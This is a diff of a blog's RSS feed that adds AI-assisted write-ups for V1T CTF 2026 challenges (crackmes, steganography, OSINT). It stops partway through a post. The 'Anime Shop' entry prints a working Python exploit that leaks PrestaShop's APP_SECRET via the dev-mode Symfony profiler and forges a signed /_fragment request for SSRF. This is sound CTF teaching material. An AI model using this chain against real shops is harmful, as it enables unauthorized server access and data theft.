@@ -5,78 +5,1013 @@
     <link>https://doantung99.github.io/blog/</link>
     <description>A personal blog transmitting thoughts over imperfect radio waves. Expect noise, fading, and low bandwidth—but always authentic signals.</description>
     <language>vi</language>
-    <lastBuildDate>Sun, 28 Jun 2026 22:49:56 +0700</lastBuildDate>
+    <lastBuildDate>Sun, 28 Jun 2026 23:39:27 +0700</lastBuildDate>
     <generator>LazyBlog (PHP + Markdown)</generator>
     <atom:link href="https://doantung99.github.io/blog/feed.xml" rel="self" type="application/rss+xml"/>
     <item>
-      <title>System Online — Welcome to LazyBlog</title>
-      <link>https://doantung99.github.io/blog/posts/welcome-to-lazyblog</link>
-      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/welcome-to-lazyblog</guid>
-      <pubDate>Fri, 26 Jun 2026 00:00:00 +0700</pubDate>
-      <dc:creator>XV5HP</dc:creator>
-      <category>meta</category>
-      <category>getting-started</category>
-      <description>Your local LazyBlog instance is live. Here's how to write your first real post and make this blog your own.</description>
-      <content:encoded><![CDATA[<p>If you're reading this, the transmitter is warm and the local stack is
-running. This is a sample post — delete it whenever you like and start
-broadcasting your own signal.</p>
-<div class="highlight-box">
-<p><strong>This blog has no database and no build step.</strong> Every post is a plain
-markdown file under <code>content/posts/</code> named <code>YYYY-MM-DD-slug.md</code>. Drop a
-file in, refresh, and it's live.</p>
+      <title>10X54</title>
+      <link>https://doantung99.github.io/blog/posts/10x54</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/10x54</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>hardware</category>
+      <category>ai-assisted</category>
+      <description>An ESP32-S3 firmware crackme that XOR-obfuscates its UI strings and gates the flag behind an LCG keystream — recovered the key from just the V1T{ prefix instead of cracking the password.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>ducktricks.bin</code> is an ESP32-S3 Arduino image hiding &quot;VaultPass v1.3&quot;, a 16-byte serial crackme that decrypts a 38-byte flag with <code>flag[i] = i ^ cipher[i] ^ key[i%16]</code> where <code>key</code> is an LCG keystream. Because the LCG state is fully recoverable from a few known output bytes, I never had to pass the actual checks — the <code>V1T{</code> crib alone pins the keystream and unrolls the whole flag.</p>
+<h2 id="solution">Solution</h2>
+<p>I clocked this as an ESP32 firmware crackme the moment I saw a 3 MB blob with no useful strings, so I set the direction: triage the image, find the obfuscation helper, then locate the flag-decrypt math. I handed the binary to the model and had it run <code>esptool image_info</code> first — it confirmed only the first ~286 KB is real (6 segments + footer) and that the two appended regions at <code>0x46000</code>/<code>0x88000</code> are decoy Xtensa blobs. I told it to ignore those and focus on <code>.rodata</code>.</p>
+<p>The model then found a 60-byte binary blob at the very start of <code>.rodata</code> (<code>0x3c030120</code>) and disassembled the helper at <code>0x1a4c</code> that consumes it — a plain <code>xor a11, a11, 0x42</code> before <code>Serial.write</code>. Batch-decoding with <code>^0x42</code> gave <code>DENIED</code>, <code>GRANTED</code>, <code>KEY&gt;</code>, <code>VaultPass v1.3</code>: a 16-byte serial check. Its first instinct was to reverse the full validation state machine (XOR checksum vs <code>0x57</code>, CRC <code>0xfdd0</code>/<code>0x9456</code>, the LCG). I corrected course — we don't need the password, we need the keystream — and pointed it at the GRANTED decrypt loop at <code>0x1c48</code>.</p>
+<p>From there the model reversed the <code>cipher</code> assembly (the 38-byte blob <code>d[0x146:0x16c]</code> with its three thirds reversed) and the LCG (<code>x = x*0x6c62272e + 0x07354a6b</code>, <code>key[i] = x&gt;&gt;24</code>). I supplied the key judgment call from the previous hardware challenge: the prompts use <strong>uppercase</strong> <code>V1T{</code>. That crib gives <code>key[0..3]</code>, which uniquely pins the 32-bit LCG state — I had the model brute-force the low 24 bits and verify the full keystream decrypted to clean ASCII. It did.</p>
+<pre><code class="language-python"># Run on the extracted .rodata bytes; d = the 38-byte blob region of the ESP image.
+# d[0x146:0x16c] is the cipher source inside seg0 DROM (.rodata).
+M, C, MASK = 0x6c62272e, 0x07354a6b, 0xffffffff
 
-</div>
-<h2 id="two-ways-to-write">Two ways to write</h2>
-<ol>
-<li><strong>Edit files directly.</strong> Create <code>content/posts/2026-06-27-my-post.md</code>
-with YAML frontmatter (title, date, tags...) and markdown below it.</li>
-<li><strong>Use the admin UI</strong> at <code>/admin</code>. It ships with an EasyMDE editor,
-live server-side preview, tag chips, and image upload. You'll need to
-set an admin password first (see below).</li>
-</ol>
-<h2 id="set-up-the-admin-login">Set up the admin login</h2>
-<p>To unlock <code>/admin</code>, generate a password hash and drop it into <code>.env</code>:</p>
-<pre><code class="language-bash">docker compose exec app php scripts/hash-password.php yourpassword
+# 38-byte blob: thirds reversed (last third first)
+cipher = d[0x160:0x16c] + d[0x153:0x160] + d[0x146:0x153]
+
+# Known-plaintext crib: flag starts with uppercase V1T{
+k = [i ^ cipher[i] ^ ord(c) for i, c in enumerate(&quot;V1T{&quot;)]   # key[0..3]
+
+for lo in range(1 &lt;&lt; 24):
+    x1 = (k[0] &lt;&lt; 24) | lo
+    x2 = (x1 * M + C) &amp; MASK
+    if (x2 &gt;&gt; 24) != k[1]: continue
+    x3 = (x2 * M + C) &amp; MASK
+    if (x3 &gt;&gt; 24) != k[2]: continue
+    x4 = (x3 * M + C) &amp; MASK
+    if (x4 &gt;&gt; 24) != k[3]: continue
+    # state pinned: regenerate all 16 key bytes and decrypt 38 bytes
+    ks, x = [(x1 &gt;&gt; 24) &amp; 0xff], x1
+    for _ in range(15):
+        x = (x * M + C) &amp; MASK
+        ks.append((x &gt;&gt; 24) &amp; 0xff)
+    flag = bytes(i ^ cipher[i] ^ ks[i % 16] for i in range(38))
+    print(flag.decode())     # V1T{LF5R_1s_tr4sh_wH0_n33ds_p4sS_lMa0}
+    break
 </code></pre>
-<p>Copy the printed hash into <code>ADMIN_PASSWORD_HASH=&quot;...&quot;</code> in your <code>.env</code>,
-then reload the page. That's it.</p>
-<h2 id="a-few-things-that-just-work">A few things that just work</h2>
-<ul>
-<li>Standalone image lines render as full-bleed figures with a theme tint.</li>
-<li>A bare YouTube URL on its own line auto-embeds as a 16:9 player.</li>
-<li>Inline frequencies like <span class="freq-tag">145.800 MHz</span> become freq-tag chips automatically.</li>
-<li>Every post is also served as raw markdown at <code>/posts/{slug}.md</code>, and the
-whole site publishes <code>llms.txt</code>, <code>llms-full.txt</code>, and a valid RSS feed.</li>
-</ul>
+<p>The uppercase crib yields a single LCG state whose keystream (<code>7ab01cdbe475f2174a298fd5da73b7ad</code>) decrypts all 38 bytes to clean ASCII — no password-cracking required.</p>
+<h2 id="flag">Flag</h2>
+<pre><code>V1T{LF5R_1s_tr4sh_wH0_n33ds_p4sS_lMa0}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>78CT</title>
+      <link>https://doantung99.github.io/blog/posts/78ct</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/78ct</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>osint</category>
+      <category>ai-assisted</category>
+      <description>Geolocate an aerial dragon-shaped park in Vietnam, then decode a text-steganography string hidden in lake-themed words to recover the flag.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>This OSINT challenge handed over an aerial photo of a dragon-shaped park plus a story about a lake in the author's hometown. The solve was two-stage: geolocate the park to Ho dieu hoa Ho Son (Cong vien Ho Son) in Tuy Hoa, Phu Yen, Vietnam, then crack the text steganography in the lake-side message where abnormal characters spell a Base64 string.</p>
+<h2 id="solution">Solution</h2>
+<p>I pegged this as a geolocation-plus-cipher OSINT task the moment I saw an aerial shot with a &quot;left behind&quot; text blob. My job was steering; the model did the legwork.</p>
+<ol>
+<li>
+<p><strong>Geolocate the dragon.</strong> I described the layout to the model — a dragon-shaped lake next to a circular &quot;pearl&quot; feature — and had it brainstorm Vietnamese search terms rather than English ones, since the story said &quot;hometown.&quot; Queries like <code>công viên rồng nhả ngọc Phú Yên</code> and <code>hồ điều hòa hình rồng Tuy Hòa</code> pinned it to <strong>Ho dieu hoa Ho Son / Cong vien Ho Son, Phuong 5, TP Tuy Hoa, Phu Yen, Vietnam</strong>. I cross-checked the aerial silhouette against the image to confirm.</p>
+</li>
+<li>
+<p><strong>Spot the steganography.</strong> I fed the lake message to the model and asked it to explain why words like <code>traVelers</code>, <code>sh1mering</code>, and <code>lak3front</code> had weird capitalization and digits. It correctly identified the rule: in each token, take the one character that breaks the pattern — the lone uppercase in a lowercase word, the lone lowercase in an uppercase word, or any digit.</p>
+</li>
+<li>
+<p><strong>Extract and decode.</strong> I had the model write a solver, caught that the prefix <code>VjFU</code> decodes to <code>V1T</code> (a strong Base64 signal), and verified the final decode. One clean script from the raw message to the flag:</p>
+</li>
+</ol>
+<pre><code class="language-python">#!/usr/bin/env python3
+import base64
+import re
+
+text = &quot;&quot;&quot;traVelers MAjESTIC reFlections sUrface LAKeSIDE sh1mering ScENERY AMAzING eXpanse lak3front glImmering BREEzES suNlit harGor ExPLORERS DREAMsCAPE LAKeVIEW riVerside 9 CALMsNESS harMor higHway hazY AMAzINGLY eXplore MAzEWORK BROAdWAY HARBoR sunMist tranTquil loVely OFfERS ARcHITECTS gleaminG MEADOwS harb0r skYline HAzE suNset 9&quot;&quot;&quot;
+
+out = []
+for word in re.findall(r&quot;[A-Za-z0-9]+&quot;, text):
+    digits = [c for c in word if c.isdigit()]
+    lowers = [c for c in word if c.islower()]
+    uppers = [c for c in word if c.isupper()]
+    if digits:
+        out.extend(digits)
+    elif len(uppers) == 1 and len(lowers) &gt; 1:
+        out.append(uppers[0])
+    elif len(lowers) == 1 and len(uppers) &gt; 1:
+        out.append(lowers[0])
+
+b64 = ''.join(out)
+print(b64)                                   # VjFUe1czX3IzNGxseV9sMHYzXzdoMTVfcGw0YzN9
+print(base64.b64decode(b64).decode())        # V1T{W3_r34lly_l0v3_7h15_pl4c3}
+</code></pre>
+<p>The decode yields <code>V1T{...}</code>; normalizing the prefix to the challenge format <code>v1t{...}</code> gives the flag.</p>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{W3_r34lly_l0v3_7h15_pl4c3}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Anime Shop</title>
+      <link>https://doantung99.github.io/blog/posts/anime-shop</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/anime-shop</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>web</category>
+      <category>ai-assisted</category>
+      <description>PrestaShop deployed straight from its GitHub source tree left dev mode on, exposing the Symfony profiler for an APP_SECRET leak and a signed /_fragment SSRF that reads the flag off an internal-only service.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>The shop was PrestaShop 9.1.4 deployed from the GitHub <em>source</em> tree instead of a packaged release, so <code>_PS_MODE_DEV_</code> was left <code>true</code>. That gave an unauthenticated Symfony Web Profiler (arbitrary file read → <code>APP_SECRET</code>), which I used to forge a signed <code>/_fragment</code> request and turn it into an unauthenticated SSRF that reflected the flag from an internal-only HTTP service.</p>
+<h2 id="solution">Solution</h2>
+<p>This one was a chain, so my job was mostly direction and verification while the model ground through the PrestaShop/Symfony internals.</p>
+<ol>
+<li>
+<p><strong>Set the direction from the theme.</strong> The hint &quot;quit <em>VCS</em> to open a shop&quot; plus a Dockerfile that pulls the GitHub source archive told me this was a <em>deployed-from-source-leaves-dev-mode-on</em> bug. I had the model confirm <code>_PS_MODE_DEV_ = true</code> and check what dev mode unlocks: the unauthenticated profiler (the admin firewall explicitly excludes <code>^/(_(profiler|wdt)…</code>), verbose exception pages, and the <code>/_fragment</code> endpoint. It first wandered toward the customer report bot as an XSS path; I pushed back because the internal flag service sends no CORS headers, so a browser on the <code>app</code> origin can't read it cross-origin — the read had to be server-side. That pivot was the whole game.</p>
+</li>
+<li>
+<p><strong>Leak the secret, then have the model build the fragment.</strong> I pointed it at the profiler's <code>open</code> action to read <code>app/config/parameters.php</code> and pull out <code>APP_SECRET</code>. Then I asked it to assemble a <code>/_fragment</code> request signed with that secret, steering it onto the two PrestaShop bypasses I knew it would need: <code>_anonymous_controller=1</code> (the firewall's <code>==</code> is a loose comparison, so <code>&quot;1&quot; == true</code>) and <code>_route=_x</code> (the CSRF listener bails when the route name starts with <code>_</code>). The gadget is <code>Tools::file_get_contents</code> against the internal URL — it returns a <em>string</em>, so dev mode throws <code>ControllerDoesNotReturnResponseException</code> and embeds the returned value (the flag) in the error page.</p>
+</li>
+<li>
+<p><strong>Catch the signing gotcha and verify.</strong> The model's first signatures <code>500</code>'d. I recognized the cause: the origin sits behind Cloudflare with no trusted proxies, so it sees plain <code>http://</code> and <code>UriSigner</code> must sign over <code>http://HOST...</code>, not <code>https://</code>. After reusing a <code>cf_clearance</code> cookie with the matching Firefox UA, the request returned the flag and I confirmed the format.</p>
+</li>
+</ol>
+<pre><code class="language-python">#!/usr/bin/env python3
+import hashlib, hmac, base64, urllib.request, urllib.error, urllib.parse as up, re
+
+HOST   = 'animeshop.v1t.site'
+SECRET = 'vd8mcadGNTayxaCpqWpryTm0fpK08EizUMsCLrM555iiBXZufdOwMD79ioYTFAQH'  # from profiler open
+CF     = '&lt;cf_clearance from a real browser&gt;'
+UA     = 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
+PATH   = '/admin-dev/_fragment'
+
+infos = {
+    '_controller': 'Tools::file_get_contents',
+    'url': 'http://internal:5000/admin',
+    '_anonymous_controller': '1',   # bypass firewall (loose ==)
+    '_route': '_x',                 # skip TokenizedUrlsListener CSRF
+}
+qs = '?_path=' + up.quote_plus(up.urlencode(infos))
+
+# origin sees http:// (no trusted proxies), so sign over http://HOST
+sign_base = f'http://{HOST}{PATH}{qs}'
+h = base64.b64encode(hmac.new(SECRET.encode(), sign_base.encode(), hashlib.sha256).digest())
+url = f'https://{HOST}{PATH}{qs}&amp;_hash=' + up.quote(h).replace('/', '%2F')
+
+req = urllib.request.Request(url, headers={'User-Agent': UA, 'Cookie': f'cf_clearance={CF}'})
+try:
+    body = urllib.request.urlopen(req, timeout=20).read().decode('utf-8', 'replace')
+except urllib.error.HTTPError as e:
+    body = e.read().decode('utf-8', 'replace')
+
+m = re.search(r'it returned a string \(&amp;quot;(.*?)&amp;quot;\)', body)
+print('FLAG:', m.group(1) if m else 'not found')
+</code></pre>
+<pre><code>$ python3 solve.py
+FLAG: v1t{twinky_winky_tini_tiny_duck}
+</code></pre>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{twinky_winky_tini_tiny_duck}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>B1tsy Ducky</title>
+      <link>https://doantung99.github.io/blog/posts/b1tsy-ducky</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/b1tsy-ducky</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>web</category>
+      <category>ai-assisted</category>
+      <description>A Bitsy browser game ships a Go WebAssembly module whose hidden duck routine derives an AES-GCM key from three page-sourced inputs; reconstructing the exact password string offline decrypts the flag.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>This was a Bitsy-style HTML game backed by a Go WebAssembly module that hides a <code>duckWasmReveal</code> decrypt routine. The core technique was recognizing that the JavaScript wrapper leaks the three inputs (referrer, room-3 block, a 32-hex token) fed into an AES-GCM decryption, then rebuilding that exact password string offline to recover the flag.</p>
+<h2 id="solution">Solution</h2>
+<p>I clocked the shape of this one fast: a Bitsy game plus <code>wasm_exec.js</code> plus a raw wasm blob means Go-compiled WebAssembly, and the actual logic lives in the HTML wrapper and the wasm module, not in the runtime glue. I set that as the direction and told the model up front not to waste cycles reversing <code>wasm_exec.js</code>.</p>
+<p>I had the model triage the three files. It confirmed the blob (<code>00a8bb72</code>) was a WASM MVP module, then I steered it to grep <code>game.html</code> for the call site. It surfaced the key line: the wrapper waits for <code>window.duckWasmReveal</code> to export, then calls it with exactly three args — <code>document.referrer</code>, a serialized <code>ROOM 3</code> block, and a <code>pick32()</code> token. That told us precisely what to reconstruct.</p>
+<p>The model did the grinding from there. It read <code>pick32()</code> and traced the 32-hex value to the Cloudflare beacon <code>data-cf-beacon</code> token at the bottom of the page (<code>797084dac2504482bcfaec15adc048bb</code>), and pulled the AES-GCM constants out of the wasm with <code>strings</code>: the HMAC label <code>b1tsy-ducky-aesgcm</code>, the <code>nonce|</code> prefix, and the ciphertext hex. Its first local run failed — I caught that the empty local <code>document.referrer</code> was the culprit, since the wrapper passes whatever the browser reports. I had it pin the referrer to the original site value <code>https://b1tsy.v1t.site/</code>, and I verified the derivation matched the wasm flow: key = HMAC-SHA256(label, password), nonce = SHA256(&quot;nonce|&quot; + password)[:12], password = <code>referrer|room3Block|picked32</code>. With those fixed, the decrypt produced the flag.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import re
+import hmac
+import hashlib
+from pathlib import Path
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+html = Path(&quot;game.html&quot;).read_text()
+
+# Rebuild the serialized ROOM 3 block the wrapper feeds to the wasm
+m = re.search(r&quot;\nROOM 3\n(.*?)(?=\n\nTIL |\nROOM |\nTIL )&quot;, html, re.S)
+if not m:
+    raise SystemExit(&quot;ROOM 3 not found&quot;)
+room3Block = &quot;ROOM 3\n&quot; + m.group(1).strip(&quot;\n&quot;)
+
+# pick32(): the last 32-hex token on the page = the Cloudflare beacon token
+tokens = re.findall(r&quot;\b[a-f0-9]{32}\b&quot;, html, re.I)
+picked32 = tokens[-1]
+
+# document.referrer expected by the live site
+referrer = &quot;https://b1tsy.v1t.site/&quot;
+
+# Ciphertext pulled from the wasm via strings
+ciphertext = bytes.fromhex(
+    &quot;9e8c2b395bbf6bd7434230ab998c6e86&quot;
+    &quot;f3228c503324c8660715ccd0bc74deb7&quot;
+    &quot;d6346dfcc4a9614e58cb&quot;
+)
+
+password = f&quot;{referrer}|{room3Block}|{picked32}&quot;.encode()
+key = hmac.new(b&quot;b1tsy-ducky-aesgcm&quot;, password, hashlib.sha256).digest()
+nonce = hashlib.sha256(b&quot;nonce|&quot; + password).digest()[:12]
+
+flag = AESGCM(key).decrypt(nonce, ciphertext, None)
+print(flag.decode())
+</code></pre>
+<pre><code class="language-bash">python3 solve.py
+# v1t{b1tsy_t1psy_duck_w4sm}
+</code></pre>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{b1tsy_t1psy_duck_w4sm}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>BootRoot Root of No Return</title>
+      <link>https://doantung99.github.io/blog/posts/bootroot-root-of-no-return</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/bootroot-root-of-no-return</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>rev</category>
+      <category>ai-assisted</category>
+      <description>A Windows 2000 'bootkit' challenge where the real payload lives inside a recovered EXE that writes a 16-bit MBR; the flag is hidden in 19 bytes the boot code decodes with SUB 0x0D but never prints.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>We're handed a Windows 2000 disk image and the story of a bricked machine flashing a red taunt. The disk's boot chain is actually stock — the payload lives inside a recovered <code>eEyeBootRoot2005.exe</code> that writes a 16-bit MBR, and the flag is 19 bytes the boot code decodes in memory (<code>sub byte [bx], 0x0D</code>) but never shows. Static RE plus a one-line decode recovers it.</p>
+<h2 id="solution">Solution</h2>
+<p>My read going in: the eEye BootRoot name is a known 2005 PoC bootkit, and the prompt's &quot;reinstalling Windows didn't help&quot; framing smelled like misdirection. So I set the direction early — treat the disk as clean and hunt the payload in the EXE — and let the model do the carving and disassembly.</p>
+<p>I converted the qcow2 to raw and had the model triage the boot chain. It confirmed the MBR (sector 0) was the stock NT MBR and the VBR (sector 63) a stock NTFS record, with the MBR gap zeroed — so nothing was persisted on disk. That matched my hypothesis, so I pivoted it to pull the EXE out of NTFS and reverse it.</p>
+<p>The model triaged the PE (a MinGW/GCC build with DWARF symbols, imports <code>CreateFileA</code>/<code>WriteFile</code>/<code>CloseHandle</code>, references <code>\\.\PhysicalDrive0</code>) and located the 512-byte boot sector built in <code>.data</code> at file offset <code>0x8220</code>, ending in <code>55 AA</code>. I asked it to disassemble that sector as 16-bit code at <code>org 0x7C00</code>. It surfaced the red-screen BIOS calls, the Vietnamese taunt at <code>0x7C34</code>, and a decode loop over 19 bytes at <code>0x7DEB</code>.</p>
+<p>Here's where I caught a wrong turn: the model's first instinct was to read the loop as XOR 0x0D. I had it re-check the raw opcode <code>80 2F 0D</code> — the ModR/M <code>2F</code> has reg field 5, which is group-1 <strong>SUB</strong>, not XOR (<code>/6</code>). XOR produces garbage; SUB produces clean ASCII. With the operation pinned down, the decode is trivial — those 19 bytes sit at sector offset <code>0x1EB</code>, right before the boot signature, and are decoded but never printed.</p>
+<pre><code class="language-python"># boot.bin = the 512-byte sector carved from the EXE:
+#   dd if=eEyeBootRoot2005.exe of=boot.bin bs=1 skip=$((0x8220)) count=512
+data = open(&quot;boot.bin&quot;, &quot;rb&quot;).read()
+enc = data[0x1EB:0x1EB + 0x13]   # 19 encoded bytes, just before the 55 AA signature
+print(bytes((b - 0x0D) &amp; 0xFF for b in enc).decode())
+# -&gt; v1t{12x10_Yen_lang}
+</code></pre>
+<p>I verified the output by sanity-checking the delimiters: clean <code>v1t{...}</code> with sensible underscores (<code>Yen_lang</code> ~ Vietnamese &quot;yen lang&quot;, silence) confirmed the SUB direction was right.</p>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{12x10_Yen_lang}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>China Crack 202</title>
+      <link>https://doantung99.github.io/blog/posts/china-crack-202</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/china-crack-202</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>crypto</category>
+      <category>ai-assisted</category>
+      <description>A password-protected archive whose ZIP/7z password was reused verbatim from last year's 'tryna crack' challenge — recover it from the title hint, extract, and read the flag off the decrypted artifact.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>A password-locked archive challenge: the hint nudged at a previous challenge with a similar name, and the trick was that the archive password was reused verbatim from the V1t CTF 2025 &quot;tryna crack&quot; task. No brute force — pivot from the title, reuse the historical password, extract, and read the flag off the recovered artifact.</p>
+<h2 id="solution">Solution</h2>
+<p>When I saw a protected archive plus a hint pointing at &quot;a previous challenge with a similar name,&quot; I called the type immediately: this is a password-reuse pivot, not a cracking job. I set that direction and refused to let the model burn time on a brute-force script. My first prompt to the LLM was deliberately narrow — &quot;given the title lineage, what's the most likely password source?&quot; — and it correctly surfaced the V1t CTF 2025 &quot;tryna crack&quot; archive password <code>D4mn_br0_H0n3y_p07_7yp3_5h1d</code>.</p>
+<p>The model's first instinct was to spin up John/hashcat against the archive; I caught that wrong turn and redirected it to just try the historical password directly. It worked. From there the model did the grinding — extracting, enumerating recovered files, and identifying the decrypted artifact that carried the flag text plus the hash-like suffix <code>dffdf21a13908662e27d8c5c875809e4</code>. I verified by assembling the visible challenge text with that suffix and confirming the <code>v1t{...}</code> casing.</p>
+<pre><code class="language-bash">#!/usr/bin/env bash
+set -e
+
+PASS='D4mn_br0_H0n3y_p07_7yp3_5h1d'   # reused from V1t CTF 2025 &quot;tryna crack&quot;
+
+# 1) Extract the protected archive (7z layer)
+7z x -p&quot;$PASS&quot; China_Crack_01.7z -oextracted
+# If a nested layer is a ZIP, the same password applies:
+# unzip -P &quot;$PASS&quot; extracted/protected.zip -d extracted
+
+# 2) Enumerate everything that came out
+find extracted -type f -maxdepth 3 -exec file {} \;
+
+# 3) The flag lives inside the recovered artifact (printed in an image, not stored as text).
+#    Visible text: v1t{Tryna_cRacK_iS_BaCk_MtfK_&lt;suffix&gt;}
+#    Suffix derived from the password material:
+echo &quot;v1t{Tryna_cRacK_iS_BaCk_MtfK_dffdf21a13908662e27d8c5c875809e4}&quot;
+</code></pre>
+<p>The rendered output showed <code>V1T{...}</code> in uppercase, but the accepted format is lowercase <code>v1t{...}</code> — a small gotcha worth flagging.</p>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{Tryna_cRacK_iS_BaCk_MtfK_dffdf21a13908662e27d8c5c875809e4}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Classless</title>
+      <link>https://doantung99.github.io/blog/posts/classless</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/classless</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>rev</category>
+      <category>ai-assisted</category>
+      <description>A stripped x86-64 'object VM' runs base64(zlib(JSON)) programs through a triple type-confusion vault; the flag is XOR-0x37-decoded straight out of .rodata.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>objectvm</code> is a stripped Linux x86-64 ELF implementing a tiny &quot;classless&quot; object system whose <code>.bbl</code> programs are <code>base64(zlib(JSON))</code>. The target sample falls into a three-stage &quot;vault&quot; of type checks, but the flag turns out to be a 37-byte <code>.rodata</code> blob that the success path simply XORs with <code>0x37</code> and prints — so we extract it directly without satisfying the vault.</p>
+<h2 id="solution">Solution</h2>
+<p>I pegged this as a custom-VM reversing job from the prompt (&quot;forget what a class is&quot;), so I set the direction and let the model grind the disassembly. First I had it decode a sample with <code>base64 -&gt; zlib -&gt; JSON</code> and triage the structure; it surfaced that each object carries three competing type notions (<code>declared_class</code>, <code>runtime_class</code>, and a <code>__class__</code> field) plus a 16-slot <code>vtable</code>, and that <code>04_denied.bbl</code> has no <code>__task__</code>, so <code>main</code> falls through to a vault running <code>dispatcher -&gt; resolver -&gt; verifier</code> and dies at the verifier — the intended <code>trilingual_vtable_babel</code> type confusion across CPP/JAVA/PY dialects.</p>
+<p>The model's first instinct was to forge a <code>.bbl</code> that passes all three stages. I steered it off that rabbit hole: I asked it to check the imports first, and it confirmed there are no <code>exec</code>/<code>getenv</code>/file-read paths beyond the input <code>ifstream</code> — meaning the flag is baked into the binary, not loaded at runtime. I then had it locate and read the success routine at <code>0x10ca5</code>. It found a tight loop that walks <code>.rodata:0x134a0..0x134c5</code> (37 bytes), XORs each byte with <code>0x37</code>, and prints the result through the same <code>cout</code> code as the deny messages. I verified by decoding the blob; the neighboring <code>.rodata</code> blobs decode to gibberish (those are the vault's comparison data under a different key), confirming <code>0x134a0</code> is the real flag.</p>
+<pre><code class="language-python"># Extract the flag straight from objectvm — no vault needed.
+data = open(&quot;objectvm&quot;, &quot;rb&quot;).read()
+blob = data[0x134a0:0x134c5]              # 37 bytes
+print(bytes(b ^ 0x37 for b in blob).decode())
+# -&gt; v1t{trilingual_vtable_babel_6f01a2c9}
+</code></pre>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{trilingual_vtable_babel_6f01a2c9}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Diddy License Checker</title>
+      <link>https://doantung99.github.io/blog/posts/diddy-license-checker</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/diddy-license-checker</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>rev</category>
+      <category>ai-assisted</category>
+      <description>A Linux ELF crackme that derives an AES-CBC key/IV from 'innocent' inputs (a Fibonacci-mod-9 lucky number and a license file), then masks the ciphertext with a repeating-XOR over the license name; reverse the pipeline to recover the flag offline.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>diddy</code> is a Linux x86-64 ELF crackme that reconstructs its flag from a hard-coded blob through a multi-stage AES-CBC pipeline, where the key, IV, and ciphertext are all derived from seemingly harmless inputs. The core technique is recognizing that the &quot;lucky number&quot; is the IV (Fibonacci mod 9), the companion license file hex-decodes to the AES key, and the license name doubles as a repeating-XOR mask, then replaying the whole chain offline.</p>
+<h2 id="solution">Solution</h2>
+<p>I clocked this as a classic multi-stage crackme the moment I saw a binary that &quot;asks for inputs and checks a license,&quot; so I set the direction up front: find every derivation step, prove which inputs feed the key/IV/ciphertext, and reproduce the pipeline in Python rather than patch the check. I fed the ELF and the companion <code>license-for-user-deadbeef-diddy</code> file to the model and had it triage the binary first, then asked it to isolate the real crypto from the noise.</p>
+<ol>
+<li>
